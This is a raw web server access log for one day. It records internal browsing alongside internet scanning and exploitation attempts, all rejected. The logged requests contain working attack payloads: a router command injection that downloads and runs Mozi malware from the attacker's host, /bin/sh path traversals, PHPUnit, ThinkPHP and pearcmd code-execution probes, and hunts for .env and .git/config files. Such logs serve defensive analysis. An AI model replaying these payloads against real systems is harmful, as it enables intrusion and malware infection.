192.155.90.118 - - [03/Jul/2024:00:17:42 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03z\x9DL\xCD+\xDB\xFFY~8\xB5\x85\x09T!\x19u\x8D\x86\x82\xCE\x16\xA3\x9F\x87\xC7\x08\xCA4k?=\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
172.18.0.1 - - [03/Jul/2024:00:18:07 +0000] "GET /nginx/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:00:18:08 +0000] "GET /nginx HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:00:18:11 +0000] "GET /nginx/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:00:18:11 +0000] "GET /nginx/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:00:18:14 +0000] "GET /nginx/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
185.191.126.213 - - [03/Jul/2024:00:35:45 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
172.18.0.1 - - [03/Jul/2024:01:11:03 +0000] "GET /auth/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:01:11:04 +0000] "GET /auth/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:01:11:04 +0000] "GET /auth/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:01:11:04 +0000] "GET /auth/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:01:11:04 +0000] "GET /auth/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:01:11:10 +0000] "GET /auth2/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:01:25:57 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:01:26:01 +0000] "GET /proxy/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:01:26:01 +0000] "GET /proxy/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:01:26:04 +0000] "GET /proxy HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
13.65.21.159 - - [03/Jul/2024:01:35:43 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
13.65.21.159 - - [03/Jul/2024:01:39:17 +0000] "GET /swagger HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
13.65.21.159 - - [03/Jul/2024:01:39:18 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
13.65.21.159 - - [03/Jul/2024:01:39:19 +0000] "GET /wsman HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
13.65.21.159 - - [03/Jul/2024:01:39:22 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.240.205.34 - - [03/Jul/2024:01:39:26 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 154 "-" "-"
13.65.21.159 - - [03/Jul/2024:01:39:32 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
13.65.21.159 - - [03/Jul/2024:01:39:32 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
185.191.126.213 - - [03/Jul/2024:01:39:38 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
185.191.126.213 - - [03/Jul/2024:02:03:19 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
198.235.24.3 - - [03/Jul/2024:02:05:47 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xDF\x19\xAA\xFC\xE6A^\xBC\xF1\x9A+\x03\x0F,\x17\xD8\xB0*\x88\xD3\xA5Y7\x06\xBAe\x861\xCEF\x05, \x18`yu\xD0xG\xEE3\xDC\xBE\x9C\xD8\xDFQ\xF6\xE9\xD4>a\xEEX" 400 154 "-" "-"
198.235.24.3 - - [03/Jul/2024:02:05:47 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03|\x1A\xC5/\xDC/&\xBD\x1E\xAD*\xB6c\xFA\x9C\xA0\x0E\x15\x9A\x94\x94?\x16\xA6T\xC9\x0CS\x05\xE3\x8F\x09\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
185.180.140.5 - - [03/Jul/2024:02:16:05 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.155.90.118 - - [03/Jul/2024:02:16:23 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03 Q\x14\x9A\xB6\xB7\x98\x9C\x1Bq\xDE\x99\x82%\xFD\x96\x1B\xBB\x96\xFDj\xEB\x90\xCAw" 400 154 "-" "-"
104.152.52.210 - - [03/Jul/2024:02:22:18 +0000] "GET / HTTP/1.0" 404 150 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
177.126.59.113 - - [03/Jul/2024:02:36:50 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
143.198.204.194 - - [03/Jul/2024:02:37:48 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
143.198.204.194 - - [03/Jul/2024:02:38:37 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03U?\xD0wSBQ\xB7\xB8\x07\xC5\x06\xE5\xD1\x08a\xD66$\xDE\x8F\xFF?\x85N" 400 154 "-" "-"
46.174.191.28 - - [03/Jul/2024:03:06:09 +0000] "GET / HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
198.23.165.253 - - [03/Jul/2024:03:21:29 +0000] "GET /login.cgi HTTP/1.1" 404 122 "http://20.120.210.192:80/login.htm" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
198.23.165.253 - - [03/Jul/2024:03:21:29 +0000] "" 400 0 "-" "-"
52.76.71.100 - - [03/Jul/2024:03:24:40 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
52.76.71.100 - - [03/Jul/2024:04:08:23 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
113.103.57.128 - - [03/Jul/2024:04:11:09 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
113.103.57.128 - - [03/Jul/2024:04:11:11 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
113.103.57.128 - - [03/Jul/2024:04:11:15 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:16 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:16 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:17 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:18 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:19 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:19 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:20 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:21 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:21 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:22 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:23 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:24 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:25 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:25 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:26 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:27 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:28 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:28 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:29 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:30 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:31 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:32 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:32 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:33 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:34 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:35 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:36 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:36 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:37 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:38 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:39 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:40 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:40 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:41 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:42 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:43 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:43 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:44 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:45 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
113.103.57.128 - - [03/Jul/2024:04:11:45 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
185.191.126.213 - - [03/Jul/2024:04:13:55 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
92.249.48.202 - - [03/Jul/2024:04:42:15 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.191.126.213 - - [03/Jul/2024:04:42:21 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
94.156.68.162 - - [03/Jul/2024:05:03:43 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36"
94.156.68.162 - - [03/Jul/2024:05:05:23 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
185.191.126.213 - - [03/Jul/2024:05:49:20 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
45.79.181.94 - - [03/Jul/2024:05:54:13 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x14j\x9E>o\xCC{7\xE5(\x06\x0E%\x04H\xE7\xBD\x0Bf\x10\xECc4\x1B\xCD\xC9\x85;\xE85\x18\xD6\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
77.90.7.23 - - [03/Jul/2024:05:59:50 +0000] "GET http://example.com/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
77.90.7.23 - - [03/Jul/2024:05:59:51 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
77.90.7.23 - - [03/Jul/2024:05:59:51 +0000] "GET http://example.com/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
77.90.7.23 - - [03/Jul/2024:05:59:52 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
216.218.206.66 - - [03/Jul/2024:06:01:32 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB2t\xCE\xF0T\x11Tv\xC6\xB7\x90\xF5\xD7\x02h\xD2M\xC7eY>\xF9\xE44\xA0|]\xE8\xDE\xD6\xB4\xC9\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
172.18.0.1 - - [03/Jul/2024:06:13:39 +0000] "GET /tailnet/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [03/Jul/2024:06:13:39 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "http://mgt-svr.infra.b50/tailnet/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
15.204.52.61 - - [03/Jul/2024:06:42:19 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
92.249.48.197 - - [03/Jul/2024:06:47:28 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
138.2.83.246 - - [03/Jul/2024:06:52:56 +0000] "\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x033FkN\xA8G\x11\xCD\xEC\x15\xAF\xA9\xE3\xBEv\x93\x91\xBD\x1A\xCB\xDEB\x85g\xDE\xF4\xF9\x00\x96\xF3\xCD\x84 `\xA5\xE5\xB7#\xC0\xB8\xBC\xCC\x5C\xD8\xDB\xCC9\xF04\xB3\xB6\xEF!\xF7\x9A\xE8A\x9Fw\xFD_\xFE\xEE!\xEE\x00\x1C\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
117.198.9.188 - - [03/Jul/2024:07:07:22 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.198.9.188:42455/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 150 "-" "-"
103.203.56.1 - - [03/Jul/2024:07:10:12 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0"
77.90.7.23 - - [03/Jul/2024:07:19:17 +0000] "GET http://example.com/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
77.90.7.23 - - [03/Jul/2024:07:19:18 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
77.90.7.23 - - [03/Jul/2024:07:19:18 +0000] "GET http://example.com/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
77.90.7.23 - - [03/Jul/2024:07:19:19 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
54.191.198.58 - - [03/Jul/2024:07:21:00 +0000] "GET / HTTP/1.1" 404 150 "-" "WizDynamicScanner/1.0"
54.191.198.58 - - [03/Jul/2024:07:21:00 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36"
213.32.39.38 - - [03/Jul/2024:07:29:03 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
57.129.23.166 - - [03/Jul/2024:07:34:37 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:07:34:38 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
138.2.83.246 - - [03/Jul/2024:07:39:28 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
185.191.126.213 - - [03/Jul/2024:07:42:18 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
92.249.48.197 - - [03/Jul/2024:08:10:29 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
4.156.21.142 - - [03/Jul/2024:08:23:22 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
52.16.222.28 - - [03/Jul/2024:16:36:34 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "python-requests/2.25.1"
57.129.23.166 - - [03/Jul/2024:16:39:26 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:16:39:27 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:16 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:19 +0000] "GET /env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:20 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:23 +0000] "GET /appsettings.json HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:23 +0000] "GET /test.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:29 +0000] "GET /backend/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:29 +0000] "GET /project/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:30 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:30 +0000] "GET /adm/.env.bak HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:30 +0000] "GET /adm/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:32 +0000] "GET /adm/config.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:32 +0000] "GET /adm/.env.dist HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
43.131.59.56 - - [03/Jul/2024:16:40:38 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
141.98.83.197 - - [03/Jul/2024:17:16:30 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
77.90.7.23 - - [03/Jul/2024:17:20:16 +0000] "GET http://example.com/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
77.90.7.23 - - [03/Jul/2024:17:20:21 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
77.90.7.23 - - [03/Jul/2024:17:20:23 +0000] "GET http://example.com/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
